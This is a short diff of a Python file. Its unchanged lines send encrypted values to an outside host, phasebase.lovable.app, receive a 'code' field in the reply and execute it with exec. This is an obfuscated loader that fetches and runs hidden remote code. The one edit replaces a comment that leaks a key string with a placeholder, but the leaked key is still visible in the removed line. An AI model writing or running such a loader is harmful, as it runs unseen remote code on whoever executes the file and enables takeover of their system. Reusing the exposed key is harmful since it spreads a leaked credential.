@@ -6,4 +6,4 @@ _API="https://phasebase.lovable.app/api/public/goodluck/decode"
 _req=urllib.request.Request(_API, data=json.dumps({"ct":_CT,"iv":_IV}).encode(), headers={"Content-Type":"application/json","User-Agent":"PhaseBase-GoodLuck/1.0 (+https://phasebase.lovable.app)"})
 _src=json.loads(urllib.request.urlopen(_req).read())["code"]
 exec(compile(_src, "<phasebase>", "exec"))
-# gg the key is : 8x2z4c6v1b3n5m7k9-PHASE-4r8t2y6u1i5o9p3q
+# gg the key is : [REMOUVED]
